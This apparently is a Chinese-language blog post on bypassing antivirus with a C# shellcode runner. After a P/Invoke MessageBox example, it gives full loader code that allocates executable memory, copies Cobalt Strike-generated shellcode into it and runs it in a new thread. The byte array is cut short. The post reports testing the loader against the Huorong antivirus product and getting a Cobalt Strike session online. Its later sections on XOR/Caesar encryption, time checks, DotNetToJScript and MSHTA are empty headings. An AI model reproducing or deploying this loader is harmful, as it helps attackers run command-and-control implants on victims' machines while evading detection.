layout: post
title: Options

# Shellcode Bypass AV

## 0x01.Make a shellcode runner

本文用c#来完成实现shellcode runner，首先要知道如何使用c#调用windows API，C#调用win32 API一般使用P/Invoke的方法在DLL中使用win32api

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210828122140.png)

比如实现一个简单的messagebox功能，要先把c的数据类型转换为c#的数据类型，完整代码如下

```c#
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
namespace ConsoleApp1
{
 class Program
 {
 [DllImport("user32.dll", CharSet = CharSet.Auto)]
 public static extern int MessageBox(IntPtr hWnd, String text, String caption, 
int options);
 static void Main(string[] args)
 {
 MessageBox(IntPtr.Zero, "This is a messagebox", "This is my caption", 0);
 }
 }
}
```

实现shellcode加载器的话，首先需要三个windows API函数VirtualAlloc（主要用来实现调用进程的虚地址空间）

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210828123343.png)

CreateThread（创建线程函数）

WaitForSingleObject （等待线程结束后再执行其他）具体原因后文会说

使用使用P/Invoke的方法在DLL中加入这三个windows API，然后用cobaltstrike生成c#的shellcode

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210830212058.png)

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210830213005.png)

shellcode runner完整代码如下

```c#
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
namespace ShellcodeRunner
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
       flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
       IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32
       dwMilliseconds);
        static void Main(string[] args)
        {
            /* length: 894 bytes */
            byte[] buf = new byte[894] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0...............};

            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0,

IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);//让程序执行完毕shellcode后再结束
        }
    }
}
```

火绒测试一下，meterpreter的特征

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210830220719.png)

测试下程序运行，没有问题可以直接上线CS

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210830220839.png)

## 0x02.加密shellcode 

### Caesar加密

### XOR加密

## 0x03.时间判断

## 0x04.DoNetToJscript

## 0x05.MSHTA Bypass AV



